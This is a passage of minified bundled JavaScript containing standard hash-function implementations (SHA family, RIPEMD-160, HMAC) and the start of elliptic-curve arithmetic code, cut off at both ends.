y.length===7?"0"+y:y.length===6?"00"+y:y.length===5?"000"+y:y.length===4?"0000"+y:y.length===3?"00000"+y:y.length===2?"000000"+y:y.length===1?"0000000"+y:y}qi.zero8=c;function l(y,A,b,v){var _=b-A;r(_%4===0);for(var O=new Array(_/4),D=0,R=A;D<O.length;D++,R+=4){var P;v==="big"?P=y[R]<<24|y[R+1]<<16|y[R+2]<<8|y[R+3]:P=y[R+3]<<24|y[R+2]<<16|y[R+1]<<8|y[R],O[D]=P>>>0}return O}qi.join32=l;function u(y,A){for(var b=new Array(y.length*4),v=0,_=0;v<y.length;v++,_+=4){var O=y[v];A==="big"?(b[_]=O>>>24,b[_+1]=O>>>16&255,b[_+2]=O>>>8&255,b[_+3]=O&255):(b[_+3]=O>>>24,b[_+2]=O>>>16&255,b[_+1]=O>>>8&255,b[_]=O&255)}return b}qi.split32=u;function d(y,A){return y>>>A|y<<32-A}qi.rotr32=d;function h(y,A){return y<<A|y>>>32-A}qi.rotl32=h;function f(y,A){return y+A>>>0}qi.sum32=f;function p(y,A,b){return y+A+b>>>0}qi.sum32_3=p;function g(y,A,b,v){return y+A+b+v>>>0}qi.sum32_4=g;function w(y,A,b,v,_){return y+A+b+v+_>>>0}qi.sum32_5=w;function m(y,A,b,v){var _=y[A],O=y[A+1],D=v+O>>>0,R=(D<v?1:0)+b+_;y[A]=R>>>0,y[A+1]=D}qi.sum64=m;function x(y,A,b,v){var _=A+v>>>0,O=(_<A?1:0)+y+b;return O>>>0}qi.sum64_hi=x;function S(y,A,b,v){var _=A+v;return _>>>0}qi.sum64_lo=S;function T(y,A,b,v,_,O,D,R){var P=0,B=A;B=B+v>>>0,P+=B<A?1:0,B=B+O>>>0,P+=B<O?1:0,B=B+R>>>0,P+=B<R?1:0;var M=y+b+_+D+P;return M>>>0}qi.sum64_4_hi=T;function k(y,A,b,v,_,O,D,R){var P=A+v+O+R;return P>>>0}qi.sum64_4_lo=k;function I(y,A,b,v,_,O,D,R,P,B){var M=0,W=A;W=W+v>>>0,M+=W<A?1:0,W=W+O>>>0,M+=W<O?1:0,W=W+R>>>0,M+=W<R?1:0,W=W+B>>>0,M+=W<B?1:0;var K=y+b+_+D+P+M;return K>>>0}qi.sum64_5_hi=I;function E(y,A,b,v,_,O,D,R,P,B){var M=A+v+O+R+B;return M>>>0}qi.sum64_5_lo=E;function C(y,A,b){var v=A<<32-b|y>>>b;return v>>>0}qi.rotr64_hi=C;function N(y,A,b){var v=y<<32-b|A>>>b;return v>>>0}qi.rotr64_lo=N;function L(y,A,b){return y>>>b}qi.shr64_hi=L;function $(y,A,b){var v=y<<32-b|A>>>b;return v>>>0}return qi.shr64_lo=$,qi}var zE={},gM;function Yy(){if(gM)return zE;gM=1;var r=Zd(),e=Kg();function t(){this.pending=null,this.pendingTotal=0,this.blockSize=this.constructor.blockSize,this.outSize=this.constructor.outSize,this.hmacStrength=this.constructor.hmacStrength,this.padLength=this.constructor.padLength/8,this.endian="big",this._delta8=this.blockSize/8,this._delta32=this.blockSize/32}return zE.BlockHash=t,t.prototype.update=function(n,s){if(n=r.toArray(n,s),this.pending?this.pending=this.pending.concat(n):this.pending=n,this.pendingTotal+=n.length,this.pending.length>=this._delta8){n=this.pending;var o=n.length%this._delta8;this.pending=n.slice(n.length-o,n.length),this.pending.length===0&&(this.pending=null),n=r.join32(n,0,n.length-o,this.endian);for(var a=0;a<n.length;a+=this._delta32)this._update(n,a,a+this._delta32)}return this},t.prototype.digest=function(n){return this.update(this._pad()),e(this.pending===null),this._digest(n)},t.prototype._pad=function(){var n=this.pendingTotal,s=this._delta8,o=s-(n+this.padLength)%s,a=new Array(o+this.padLength);a[0]=128;for(var c=1;c<o;c++)a[c]=0;if(n<<=3,this.endian==="big"){for(var l=8;l<this.padLength;l++)a[c++]=0;a[c++]=0,a[c++]=0,a[c++]=0,a[c++]=0,a[c++]=n>>>24&255,a[c++]=n>>>16&255,a[c++]=n>>>8&255,a[c++]=n&255}else for(a[c++]=n&255,a[c++]=n>>>8&255,a[c++]=n>>>16&255,a[c++]=n>>>24&255,a[c++]=0,a[c++]=0,a[c++]=0,a[c++]=0,l=8;l<this.padLength;l++)a[c++]=0;return a},zE}var Fp={},Mu={},mM;function jZ(){if(mM)return Mu;mM=1;var r=Zd(),e=r.rotr32;function t(u,d,h,f){if(u===0)return i(d,h,f);if(u===1||u===3)return s(d,h,f);if(u===2)return n(d,h,f)}Mu.ft_1=t;function i(u,d,h){return u&d^~u&h}Mu.ch32=i;function n(u,d,h){return u&d^u&h^d&h}Mu.maj32=n;function s(u,d,h){return u^d^h}Mu.p32=s;function o(u){return e(u,2)^e(u,13)^e(u,22)}Mu.s0_256=o;function a(u){return e(u,6)^e(u,11)^e(u,25)}Mu.s1_256=a;function c(u){return e(u,7)^e(u,18)^u>>>3}Mu.g0_256=c;function l(u){return e(u,17)^e(u,19)^u>>>10}return Mu.g1_256=l,Mu}var WE,wM;function Ble(){if(wM)return WE;wM=1;var r=Zd(),e=Yy(),t=jZ(),i=r.rotl32,n=r.sum32,s=r.sum32_5,o=t.ft_1,a=e.BlockHash,c=[1518500249,1859775393,2400959708,3395469782];function l(){if(!(this instanceof l))return new l;a.call(this),this.h=[1732584193,4023233417,2562383102,271733878,3285377520],this.W=new Array(80)}return r.inherits(l,a),WE=l,l.blockSize=512,l.outSize=160,l.hmacStrength=80,l.padLength=64,l.prototype._update=function(d,h){for(var f=this.W,p=0;p<16;p++)f[p]=d[h+p];for(;p<f.length;p++)f[p]=i(f[p-3]^f[p-8]^f[p-14]^f[p-16],1);var g=this.h[0],w=this.h[1],m=this.h[2],x=this.h[3],S=this.h[4];for(p=0;p<f.length;p++){var T=~~(p/20),k=s(i(g,5),o(T,w,m,x),S,f[p],c[T]);S=x,x=m,m=i(w,30),w=g,g=k}this.h[0]=n(this.h[0],g),this.h[1]=n(this.h[1],w),this.h[2]=n(this.h[2],m),this.h[3]=n(this.h[3],x),this.h[4]=n(this.h[4],S)},l.prototype._digest=function(d){return d==="hex"?r.toHex32(this.h,"big"):r.split32(this.h,"big")},WE}var HE,bM;function FZ(){if(bM)return HE;bM=1;var r=Zd(),e=Yy(),t=jZ(),i=Kg(),n=r.sum32,s=r.sum32_4,o=r.sum32_5,a=t.ch32,c=t.maj32,l=t.s0_256,u=t.s1_256,d=t.g0_256,h=t.g1_256,f=e.BlockHash,p=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298];function g(){if(!(this instanceof g))return new g;f.call(this),this.h=[1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225],this.k=p,this.W=new Array(64)}return r.inherits(g,f),HE=g,g.blockSize=512,g.outSize=256,g.hmacStrength=192,g.padLength=64,g.prototype._update=function(m,x){for(var S=this.W,T=0;T<16;T++)S[T]=m[x+T];for(;T<S.length;T++)S[T]=s(h(S[T-2]),S[T-7],d(S[T-15]),S[T-16]);var k=this.h[0],I=this.h[1],E=this.h[2],C=this.h[3],N=this.h[4],L=this.h[5],$=this.h[6],y=this.h[7];for(i(this.k.length===S.length),T=0;T<S.length;T++){var A=o(y,u(N),a(N,L,$),this.k[T],S[T]),b=n(l(k),c(k,I,E));y=$,$=L,L=N,N=n(C,A),C=E,E=I,I=k,k=n(A,b)}this.h[0]=n(this.h[0],k),this.h[1]=n(this.h[1],I),this.h[2]=n(this.h[2],E),this.h[3]=n(this.h[3],C),this.h[4]=n(this.h[4],N),this.h[5]=n(this.h[5],L),this.h[6]=n(this.h[6],$),this.h[7]=n(this.h[7],y)},g.prototype._digest=function(m){return m==="hex"?r.toHex32(this.h,"big"):r.split32(this.h,"big")},HE}var VE,vM;function Mle(){if(vM)return VE;vM=1;var r=Zd(),e=FZ();function t(){if(!(this instanceof t))return new t;e.call(this),this.h=[3238371032,914150663,812702999,4144912697,4290775857,1750603025,1694076839,3204075428]}return r.inherits(t,e),VE=t,t.blockSize=512,t.outSize=224,t.hmacStrength=192,t.padLength=64,t.prototype._digest=function(n){return n==="hex"?r.toHex32(this.h.slice(0,7),"big"):r.split32(this.h.slice(0,7),"big")},VE}var KE,yM;function qZ(){if(yM)return KE;yM=1;var r=Zd(),e=Yy(),t=Kg(),i=r.rotr64_hi,n=r.rotr64_lo,s=r.shr64_hi,o=r.shr64_lo,a=r.sum64,c=r.sum64_hi,l=r.sum64_lo,u=r.sum64_4_hi,d=r.sum64_4_lo,h=r.sum64_5_hi,f=r.sum64_5_lo,p=e.BlockHash,g=[1116352408,3609767458,1899447441,602891725,3049323471,3964484399,3921009573,2173295548,961987163,4081628472,1508970993,3053834265,2453635748,2937671579,2870763221,3664609560,3624381080,2734883394,310598401,1164996542,607225278,1323610764,1426881987,3590304994,1925078388,4068182383,2162078206,991336113,2614888103,633803317,3248222580,3479774868,3835390401,2666613458,4022224774,944711139,264347078,2341262773,604807628,2007800933,770255983,1495990901,1249150122,1856431235,1555081692,3175218132,1996064986,2198950837,2554220882,3999719339,2821834349,766784016,2952996808,2566594879,3210313671,3203337956,3336571891,1034457026,3584528711,2466948901,113926993,3758326383,338241895,168717936,666307205,1188179964,773529912,1546045734,1294757372,1522805485,1396182291,2643833823,1695183700,2343527390,1986661051,1014477480,2177026350,1206759142,2456956037,344077627,2730485921,1290863460,2820302411,3158454273,3259730800,3505952657,3345764771,106217008,3516065817,3606008344,3600352804,1432725776,4094571909,1467031594,275423344,851169720,430227734,3100823752,506948616,1363258195,659060556,3750685593,883997877,3785050280,958139571,3318307427,1322822218,3812723403,1537002063,2003034995,1747873779,3602036899,1955562222,1575990012,2024104815,1125592928,2227730452,2716904306,2361852424,442776044,2428436474,593698344,2756734187,3733110249,3204031479,2999351573,3329325298,3815920427,3391569614,3928383900,3515267271,566280711,3940187606,3454069534,4118630271,4000239992,116418474,1914138554,174292421,2731055270,289380356,3203993006,460393269,320620315,685471733,587496836,852142971,1086792851,1017036298,365543100,1126000580,2618297676,1288033470,3409855158,1501505948,4234509866,1607167915,987167468,1816402316,1246189591];function w(){if(!(this instanceof w))return new w;p.call(this),this.h=[1779033703,4089235720,3144134277,2227873595,1013904242,4271175723,2773480762,1595750129,1359893119,2917565137,2600822924,725511199,528734635,4215389547,1541459225,327033209],this.k=g,this.W=new Array(160)}r.inherits(w,p),KE=w,w.blockSize=1024,w.outSize=512,w.hmacStrength=192,w.padLength=128,w.prototype._prepareBlock=function(b,v){for(var _=this.W,O=0;O<32;O++)_[O]=b[v+O];for(;O<_.length;O+=2){var D=$(_[O-4],_[O-3]),R=y(_[O-4],_[O-3]),P=_[O-14],B=_[O-13],M=N(_[O-30],_[O-29]),W=L(_[O-30],_[O-29]),K=_[O-32],q=_[O-31];_[O]=u(D,R,P,B,M,W,K,q),_[O+1]=d(D,R,P,B,M,W,K,q)}},w.prototype._update=function(b,v){this._prepareBlock(b,v);var _=this.W,O=this.h[0],D=this.h[1],R=this.h[2],P=this.h[3],B=this.h[4],M=this.h[5],W=this.h[6],K=this.h[7],q=this.h[8],J=this.h[9],le=this.h[10],ae=this.h[11],U=this.h[12],G=this.h[13],Z=this.h[14],j=this.h[15];t(this.k.length===_.length);for(var Y=0;Y<_.length;Y+=2){var se=Z,ne=j,Te=E(q,J),Re=C(q,J),$e=m(q,J,le,ae,U),Ae=x(q,J,le,ae,U,G),De=this.k[Y],Le=this.k[Y+1],it=_[Y],nt=_[Y+1],ct=h(se,ne,Te,Re,$e,Ae,De,Le,it,nt),St=f(se,ne,Te,Re,$e,Ae,De,Le,it,nt);se=k(O,D),ne=I(O,D),Te=S(O,D,R,P,B),Re=T(O,D,R,P,B,M);var zt=c(se,ne,Te,Re),Q=l(se,ne,Te,Re);Z=U,j=G,U=le,G=ae,le=q,ae=J,q=c(W,K,ct,St),J=l(K,K,ct,St),W=B,K=M,B=R,M=P,R=O,P=D,O=c(ct,St,zt,Q),D=l(ct,St,zt,Q)}a(this.h,0,O,D),a(this.h,2,R,P),a(this.h,4,B,M),a(this.h,6,W,K),a(this.h,8,q,J),a(this.h,10,le,ae),a(this.h,12,U,G),a(this.h,14,Z,j)},w.prototype._digest=function(b){return b==="hex"?r.toHex32(this.h,"big"):r.split32(this.h,"big")};function m(A,b,v,_,O){var D=A&v^~A&O;return D<0&&(D+=4294967296),D}function x(A,b,v,_,O,D){var R=b&_^~b&D;return R<0&&(R+=4294967296),R}function S(A,b,v,_,O){var D=A&v^A&O^v&O;return D<0&&(D+=4294967296),D}function T(A,b,v,_,O,D){var R=b&_^b&D^_&D;return R<0&&(R+=4294967296),R}function k(A,b){var v=i(A,b,28),_=i(b,A,2),O=i(b,A,7),D=v^_^O;return D<0&&(D+=4294967296),D}function I(A,b){var v=n(A,b,28),_=n(b,A,2),O=n(b,A,7),D=v^_^O;return D<0&&(D+=4294967296),D}function E(A,b){var v=i(A,b,14),_=i(A,b,18),O=i(b,A,9),D=v^_^O;return D<0&&(D+=4294967296),D}function C(A,b){var v=n(A,b,14),_=n(A,b,18),O=n(b,A,9),D=v^_^O;return D<0&&(D+=4294967296),D}function N(A,b){var v=i(A,b,1),_=i(A,b,8),O=s(A,b,7),D=v^_^O;return D<0&&(D+=4294967296),D}function L(A,b){var v=n(A,b,1),_=n(A,b,8),O=o(A,b,7),D=v^_^O;return D<0&&(D+=4294967296),D}function $(A,b){var v=i(A,b,19),_=i(b,A,29),O=s(A,b,6),D=v^_^O;return D<0&&(D+=4294967296),D}function y(A,b){var v=n(A,b,19),_=n(b,A,29),O=o(A,b,6),D=v^_^O;return D<0&&(D+=4294967296),D}return KE}var GE,xM;function Dle(){if(xM)return GE;xM=1;var r=Zd(),e=qZ();function t(){if(!(this instanceof t))return new t;e.call(this),this.h=[3418070365,3238371032,1654270250,914150663,2438529370,812702999,355462360,4144912697,1731405415,4290775857,2394180231,1750603025,3675008525,1694076839,1203062813,3204075428]}return r.inherits(t,e),GE=t,t.blockSize=1024,t.outSize=384,t.hmacStrength=192,t.padLength=128,t.prototype._digest=function(n){return n==="hex"?r.toHex32(this.h.slice(0,12),"big"):r.split32(this.h.slice(0,12),"big")},GE}var CM;function Lle(){return CM||(CM=1,Fp.sha1=Ble(),Fp.sha224=Mle(),Fp.sha256=FZ(),Fp.sha384=Dle(),Fp.sha512=qZ()),Fp}var ZE={},EM;function Ule(){if(EM)return ZE;EM=1;var r=Zd(),e=Yy(),t=r.rotl32,i=r.sum32,n=r.sum32_3,s=r.sum32_4,o=e.BlockHash;function a(){if(!(this instanceof a))return new a;o.call(this),this.h=[1732584193,4023233417,2562383102,271733878,3285377520],this.endian="little"}r.inherits(a,o),ZE.ripemd160=a,a.blockSize=512,a.outSize=160,a.hmacStrength=192,a.padLength=64,a.prototype._update=function(w,m){for(var x=this.h[0],S=this.h[1],T=this.h[2],k=this.h[3],I=this.h[4],E=x,C=S,N=T,L=k,$=I,y=0;y<80;y++){var A=i(t(s(x,c(y,S,T,k),w[d[y]+m],l(y)),f[y]),I);x=I,I=k,k=t(T,10),T=S,S=A,A=i(t(s(E,c(79-y,C,N,L),w[h[y]+m],u(y)),p[y]),$),E=$,$=L,L=t(N,10),N=C,C=A}A=n(this.h[1],T,L),this.h[1]=n(this.h[2],k,$),this.h[2]=n(this.h[3],I,E),this.h[3]=n(this.h[4],x,C),this.h[4]=n(this.h[0],S,N),this.h[0]=A},a.prototype._digest=function(w){return w==="hex"?r.toHex32(this.h,"little"):r.split32(this.h,"little")};function c(g,w,m,x){return g<=15?w^m^x:g<=31?w&m|~w&x:g<=47?(w|~m)^x:g<=63?w&x|m&~x:w^(m|~x)}function l(g){return g<=15?0:g<=31?1518500249:g<=47?1859775393:g<=63?2400959708:2840853838}function u(g){return g<=15?1352829926:g<=31?1548603684:g<=47?1836072691:g<=63?2053994217:0}var d=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8,3,10,14,4,9,15,8,1,2,7,0,6,13,11,5,12,1,9,11,10,0,8,12,4,13,3,7,15,14,5,6,2,4,0,5,9,7,12,2,10,14,1,3,8,11,6,15,13],h=[5,14,7,0,9,2,11,4,13,6,15,8,1,10,3,12,6,11,3,7,0,13,5,10,14,15,8,12,4,9,1,2,15,5,1,3,7,14,6,9,11,8,12,2,10,0,4,13,8,6,4,1,3,11,15,0,5,12,2,13,9,7,10,14,12,15,10,4,1,5,8,7,6,2,13,14,0,3,9,11],f=[11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8,7,6,8,13,11,9,7,15,7,12,15,9,11,7,13,12,11,13,6,7,14,9,13,15,14,8,13,6,5,12,7,5,11,12,14,15,14,15,9,8,9,14,5,6,8,6,5,12,9,15,5,11,6,8,13,12,5,12,13,14,11,8,5,6],p=[8,9,9,11,13,15,15,5,7,7,8,11,14,14,12,6,9,13,15,7,12,8,9,11,7,7,12,7,6,15,13,11,9,7,15,11,8,6,6,14,12,13,5,14,13,13,7,5,15,5,8,11,14,14,6,14,6,9,12,9,12,5,15,8,8,5,12,9,12,5,14,6,8,13,6,5,15,13,11,11];return ZE}var YE,_M;function jle(){if(_M)return YE;_M=1;var r=Zd(),e=Kg();function t(i,n,s){if(!(this instanceof t))return new t(i,n,s);this.Hash=i,this.blockSize=i.blockSize/8,this.outSize=i.outSize/8,this.inner=null,this.outer=null,this._init(r.toArray(n,s))}return YE=t,t.prototype._init=function(n){n.length>this.blockSize&&(n=new this.Hash().update(n).digest()),e(n.length<=this.blockSize);for(var s=n.length;s<this.blockSize;s++)n.push(0);for(s=0;s<n.length;s++)n[s]^=54;for(this.inner=new this.Hash().update(n),s=0;s<n.length;s++)n[s]^=106;this.outer=new this.Hash().update(n)},t.prototype.update=function(n,s){return this.inner.update(n,s),this},t.prototype.digest=function(n){return this.outer.update(this.inner.digest()),this.outer.digest(n)},YE}var SM;function Rx(){return SM||(SM=1,function(r){var e=r;e.utils=Zd(),e.common=Yy(),e.sha=Lle(),e.ripemd=Ule(),e.hmac=jle(),e.sha1=e.sha.sha1,e.sha256=e.sha.sha256,e.sha224=e.sha.sha224,e.sha384=e.sha.sha384,e.sha512=e.sha.sha512,e.ripemd160=e.ripemd.ripemd160}(FE)),FE}var Fle=Rx();const ya=Ss(Fle);function v3(r,e,t){return t={path:e,exports:{},require:function(i,n){return qle(i,n??t.path)}},r(t,t.exports),t.exports}function qle(){throw new Error("Dynamic requires are not currently supported by @rollup/plugin-commonjs")}var w$=zZ;function zZ(r,e){if(!r)throw new Error(e||"Assertion failed")}zZ.equal=function(e,t,i){if(e!=t)throw new Error(i||"Assertion failed: "+e+" != "+t)};var au=v3(function(r,e){var t=e;function i(o,a){if(Array.isArray(o))return o.slice();if(!o)return[];var c=[];if(typeof o!="string"){for(var l=0;l<o.length;l++)c[l]=o[l]|0;return c}if(a==="hex"){o=o.replace(/[^a-z0-9]+/ig,""),o.length%2!==0&&(o="0"+o);for(var l=0;l<o.length;l+=2)c.push(parseInt(o[l]+o[l+1],16))}else for(var l=0;l<o.length;l++){var u=o.charCodeAt(l),d=u>>8,h=u&255;d?c.push(d,h):c.push(h)}return c}t.toArray=i;function n(o){return o.length===1?"0"+o:o}t.zero2=n;function s(o){for(var a="",c=0;c<o.length;c++)a+=n(o[c].toString(16));return a}t.toHex=s,t.encode=function(a,c){return c==="hex"?s(a):a}}),_c=v3(function(r,e){var t=e;t.assert=w$,t.toArray=au.toArray,t.zero2=au.zero2,t.toHex=au.toHex,t.encode=au.encode;function i(c,l,u){var d=new Array(Math.max(c.bitLength(),u)+1),h;for(h=0;h<d.length;h+=1)d[h]=0;var f=1<<l+1,p=c.clone();for(h=0;h<d.length;h++){var g,w=p.andln(f-1);p.isOdd()?(w>(f>>1)-1?g=(f>>1)-w:g=w,p.isubn(g)):g=0,d[h]=g,p.iushrn(1)}return d}t.getNAF=i;function n(c,l){var u=[[],[]];c=c.clone(),l=l.clone();for(var d=0,h=0,f;c.cmpn(-d)>0||l.cmpn(-h)>0;){var p=c.andln(3)+d&3,g=l.andln(3)+h&3;p===3&&(p=-1),g===3&&(g=-1);var w;(p&1)===0?w=0:(f=c.andln(7)+d&7,(f===3||f===5)&&g===2?w=-p:w=p),u[0].push(w);var m;(g&1)===0?m=0:(f=l.andln(7)+h&7,(f===3||f===5)&&p===2?m=-g:m=g),u[1].push(m),2*d===w+1&&(d=1-d),2*h===m+1&&(h=1-h),c.iushrn(1),l.iushrn(1)}return u}t.getJSF=n;function s(c,l,u){var d="_"+l;c.prototype[l]=function(){return this[d]!==void 0?this[d]:this[d]=u.call(this)}}t.cachedProperty=s;function o(c){return typeof c=="string"?t.toArray(c,"hex"):c}t.parseBytes=o;function a(c){return new pr(c,"hex","le")}t.intFromLE=a}),L9=_c.getNAF,zle=_c.getJSF,U9=_c.assert;function Ep(r,e){this.type=r,this.p=new pr(e.p,16),this.red=e.prime?pr.red(e.prime):pr.mont(this.p),this.zero=new pr(0).toRed(this.red),this.one=new pr(1).toRed(this.red),this.two=new pr(2).toRed(this.red),this.n=e.n&&new pr(e.n,16),this.g=e.g&&this.pointFromJSON(e.g,e.gRed),this._wnafT1=new Array(4),this._wnafT2=new Array(4),this._wnafT3=new Array(4),this._wnafT4=new Array(4),this._bitLength=this.n?this.n.bitLength():0;var t=this.n&&this.p.div(this.n);!t||t.cmpn(100)>0?this.redN=null:(this._maxwellTrick=!0,this.redN=this.n.toRed(this.red))}var Gg=Ep;Ep.prototype.point=function(){throw new Error("Not implemented")};Ep.prototype.validate=function(){throw new Error("Not implemented")};Ep.prototype._fixedNafMul=function(e,t){U9(e.precomputed);var i=e._getDoubles(),n=L9(t,1,this._bitLength),s=(1<<i.step+1)-(i.step%2===0?2:1);s/=3;var o=[],a,c;for(a=0;a<n.length;a+=i.step){c=0;for(var l=a+i.step-1;l>=a;l--)c=(c<<1)+n[l];o.push(c)}for(var u=this.jpoint(null,null,null),d=this.jpoint(null,null,null),h=s;h>0;h--){for(a=0;a<o.length;a++)c=o[a],c===h?d=d.mixedAdd(i.points[a]):c===-h&&(d=d.mixedAdd(i.points[a].neg()));u=u.add(d)}return u.toP()};Ep.prototype._wnafMul=function(e,t){var i=4,n=e._getNAFPoints(i);i=n.wnd;for(var s=n.points,o=L9(t,i,this._bitLength),a=this.jpoint(null,null,null),c=o.length-1;c>=0;c--){for(var l=0;c>=0&&o[c]===0;c--)l++;if(c>=0&&l++,a=a.dblp(l),c<0)break;var u=o[c];U9(u!==0),e.type==="affine"?u>0?a=a.mixedAdd(s[u-1>>1]):a=a.mixedAdd(s[-u-1>>1].neg()):u>0?a=a.add(s[u-1>>1]):a=a.add(s[-u-1>>1].neg())}return e.type==="affine"?a.toP():a};Ep.prototype._wnafMulAdd=function(e,t,i,n,s){var o=this._wnafT1,a=this._wnafT2,c=this._wnafT3,l=0,u,d,h;for(u=0;u<n;u++){h=t[u];var f=h._getNAFPoints(e);o[u]=f.wnd,a[u]=f.points}for(u=n-1;u>=1;u-=2){var p=u-1,g=u;if(o[p]!==1||o[g]!==1){c[p]=L9(i[p],o[p],this._bitLength),c[g]=L9(i[g],o[g],this._bitLength),l=Math.max(c[p].length,l),l=Math.max(c[g].length,l);continue}var w=[t[p],null,null,t[g]];t[p].y.cmp(t[g].y)===0?(w[1]=t[p].add(t[g]),w[2]=t[p].toJ().mixedAdd(t[g].neg())):t[p].y.cmp(t[g].y.redNeg())===0?(w[1]=t[p].toJ().mixedAdd(t[g]),w[2]=t[p].add(t[g].neg())):(w[1]=t[p].toJ().mixedAdd(t[g]),w[2]=t[p].toJ().mixedAdd(t[g].neg()));var m=[-3,-1,-5,-7,0,7,5,1,3],x=zle(i[p],i[g]);for(l=Math.max(x[0].length,l),c[p]=new Array(l),c[g]=new Array(l),d=0;d<l;d++){var S=x[0][d]|0,T=x[1][d]|0;c[p][d]=m[(S+1)*3+(T+1)],c[g][d]=0,a[p]=w}}var k=this.jpoint(null,null,null),I=this._wnafT4;for(u=l;u>=0;u--){for(var E=0;u>=0;){var C=!0;for(d=0;d<n;d++)I[d]=c[d][u]|0,I[d]!==0&&(C=!1);if(!C)break;E++,u--}if(u>=0&&E++,k=k.dblp(E),u<0)break;for(d=0;d<n;d++){var N=I[d];N!==0&&(N>0?h=a[d][N-1>>1]:N<0&&(h=a[d][-N-1>>1].neg()),h.type==="affine"?k=k.mixedAdd(h):k=k.add(h))}}for(u=0;u<n;u++)a[u]=null;return s?k:k.toP()};function gl(r,e){this.curve=r,this.type=e,this.precomputed=null}Ep.BasePoint=gl;gl.prototype.eq=function(){throw new Error("Not implemented")};gl.prototype.validate=function(){return this.curve.validate(this)};Ep.prototype.decodePoint=function(e,t){e=_c.toArray(e,t);var i=this.p.byteLength();if((e[0]===4||e[0]===6||e[0]===7)&&e.length-1===2*i){e[0]===6?U9(e[e.length-1]%2===0):e[0]===7&&U9(e[e.length-1]%2===1);var n=this.point(e.slice(1,1+i),e.slice(1+i,1+2*i));return n}else if((e[0]===2||e[0]===3)&&e.length-1===i)return this.pointFromX(e.slice(1,1+i),e[0]===3);throw new Error("Unknown point format")};gl.prototype.encodeCompressed=function(e){return this.encode(e,!0)};gl.prototype._encode=function(e){var t=this.curve.p.byteLength(),i=this.getX().toArray("be",t);return e?[this.getY().isEven()?2:3].concat(i):[4].concat(i,this.getY().toArray("be",t))};gl.prototype.encode=function(e,t){return _c.encode(this._encode(t),e)};gl.prototype.precompute=function(e){if(this.precomputed)return this;var t={doubles:null,naf:null,beta:null};return t.naf=this._getNAFPoints(8),t.doubles=this._getDoubles(4,e),t.beta=this._getBeta(),this.precomputed=t,this};gl.prototype._hasDoubles=function(e){if(!this.precomputed)return!1;var t=this.precomputed.doubles;return t?t.points.length>=Math.ceil((e.bitLength()+1)/t.step):!1};gl.prototype._getDoubles=function(e,t){if(this.precomputed&&this.precomputed.doubles)return this.precomputed.doubles;for(var i=[this],n=this,s=0;s<t;s+=e){for(var o=0;o<e;o++)n=n.dbl();i.push(n)}return{step:e,points:i}};gl.prototype._getNAFPoints=function(e){if(this.precomputed&&this.precomputed.naf)return this.precomputed.naf;for(var t=[this],i=(1<<e)-1,n=i===1?null:this.dbl(),s=1;s<i;s++)t[s]=t[s-1].add(n);return{wnd:e,points:t}};gl.prototype._getBeta=function(){return null};gl.prototype.dblp=function(e){for(var t=this,i=0;i<e;i++)t=t.dbl();return t};var b$=v3(function(r){typeof Object.create=="function"?r.exports=function(t,i){i&&(t.super_=i,t.prototype=Object.create(i.prototype,{constructor:{value:t,enumerable:!1,writable:!0,configurable:!0}}))}:r.exports=function(t,i){if(i){t.super_=i;var n=function(){};n.prototype=i.prototype,t.prototype=new n,t.prototype.constructor=t}}}),Wle=_c.assert;function ml(r){Gg.call(this,"short",r),this.a=new pr(r.a,16).toRed(this.red),this.b=new pr(r.b,16).toRed(this.red),this.tinv=this.two.redInvm(),this.zeroA=this.a.fromRed().cmpn(0)===0,this.threeA=this.a.fromRed().sub(this.p).cmpn(-3)===0,this.endo=this._getEndomorphism(r),this._endoWnafT1=new Array(4),this._endoWnafT2=new Array(4)}b$(ml,Gg);var Hle=ml;ml.prototype._getEndomorphism=function(e){if(!(!this.zeroA||!this.g||!this.n||this.p.modn(3)!==1)){var t,i;if(e.beta)t=new pr(e.beta,16).toRed(this.red);else{var n=this._getEndoRoots(this.p);t=n[0].cmp(n[1])<0?n[0]:n[1],t=t.toRed(this.red)}if(e.lambda)i=new pr(e.lambda,16);else{var s=this._getEndoRoots(this.n);this.g.mul(s[0]).x.cmp(this.g.x.redMul(t))===0?i=s[0]:(i=s[1],Wle(this.g.mul(i).x.cmp(this.g.x.redMul(t))===0))}var o;return e.basis?o=e.basis.map(function(a){return{a:new pr(a.a,16),b:new pr(a.b,16)}}):o=this._getEndoBasis(i),{beta:t,lambda:i,basis:o}}};ml.prototype._getEndoRoots=function(e){var t=e===this.p?this.red:pr.mont(e),i=new pr(2).toRed(t).redInvm(),n=i.redNeg(),s=new pr(3).toRed(t).redNeg().redSqrt().redMul(i),o=n.redAdd(s).fromRed(),a=n.redSub(s).fromRed();return[o,a]};ml.prototype._getEndoBasis=function(e){for(var t=this.n.ushrn(Math.floor(this.n.bitLength()/2)),i=e,n=this.n.clone(),s=new pr(1),o=new pr(0),a=new pr(0),c=new pr(1),l,u,d,h,f,p,g,w=0,m,x;i.cmpn(0)!==0;){var S=n.div(i);m=n.sub(S.mul(i)),x=a.sub(S.mul(s));var T=c.sub(S.mul(o));if(!d&&m.cmp(t)<0)l=g.neg(),u=s,d=m.neg(),h=x;else if(d&&++w===2)break;g=m,n=i,i=m,a=s,s=x,c=o,o=T}f=m.neg(),p=x;var k=d.sqr().add(h.sqr()),I=f.sqr().add(p.sqr());return I.cmp(k)>=0&&(f=l,p=u),d.negative&&(d=d.neg(),h=h.neg()),f.negative&&(f=f.neg(),p=p.neg()),[{a:d,b:h},{a:f,b:p}]};ml.prototype._endoSplit=function(e){var t=this.endo.basis,i=t[0],n=t[1],s=n.b.mul(e).divRound(this.n),o=i.b.neg().mul(e).divRound(this.n),a=s.mul(i.a),c=o.mul(n.a),l=s.mul(i.b),u=o.mul(n.b),d=e.sub(a).sub(c),h=l.add(u).neg();return{k1:d,k2:h}};ml.prototype.pointFromX=function(e,t){e=new 